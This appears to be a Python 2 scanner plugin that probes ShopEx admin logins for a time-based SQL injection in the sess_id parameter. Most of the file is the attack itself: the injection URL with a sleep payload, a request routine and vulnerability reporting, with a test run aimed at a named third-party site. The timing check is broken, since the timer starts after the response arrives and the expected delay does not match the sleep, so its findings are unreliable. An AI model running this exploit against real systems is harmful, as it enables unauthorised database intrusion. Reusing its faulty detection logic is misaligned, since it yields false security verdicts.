#!/usr/bin/python2.7
#coding:utf-8

import requests
from time import clock
from dummy import *

info = {
	'NAME':'ShopEx sess_id SQL Injection',
	'AUTHOR':'seay,yangbh',
	'TIME':'20140811',
	'WEB':'',
	'DESCRIPTION':'Via：http://www.cnseay.com/3426/'
}
opts = [
	['url','http://testasp.vulnweb.com','target url'],
]

def Audit(services):
	retinfo = None
	output = ''
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'Shopex':
			output += 'plugin run' + os.linesep
			url = services['url'] + '/shopadmin/index.php?ctl=passport&act=login&sess_id=1%27%20and%20sleep%283%29--%201'
			try:
				rqu = requests.get(url)
				start = clock()
				if rqu.status_code == 200:
					if rqu.text.find('<b>Warning</b>:  INSERT INTO `') != -1 or clock()-start in range(7,12):
						retinfo = {'level':'low','content':url}
						output += 'Vula:\t' + url
						security_note(url)
			except:
				pass
	return (retinfo,output)
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)